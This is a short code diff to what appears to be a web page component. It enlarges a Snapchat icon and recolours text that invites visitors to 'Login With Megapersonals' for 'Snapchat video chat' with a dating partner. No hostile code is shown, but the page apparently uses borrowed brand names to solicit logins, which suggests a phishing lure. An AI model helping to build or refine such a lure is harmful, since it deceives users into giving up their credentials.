@@ -27,7 +27,7 @@ export default function Home() {
             <div class="p-5 w-[400px]">
               <div class="mx-auto flex items-center justify-center mt-5">
                 <img
-                  class="h-16 w-20 text-center"
+                  class="h-28 w-36 text-center"
                   src="/images/snapchat-icon.png"
                   alt=""
                 />
@@ -37,7 +37,7 @@ export default function Home() {
               </h2>
               <p class="text-xl pt-5 font-semibold text-[#707b8e]">
                 Login With Megapersonals and enjoy with{" "}
-                <b class="text-[#00BE70]">Snapchat video chat</b> your dating
+                <b class="text-yellow-500">Snapchat video chat</b> your dating
                 partner.
               </p>
 
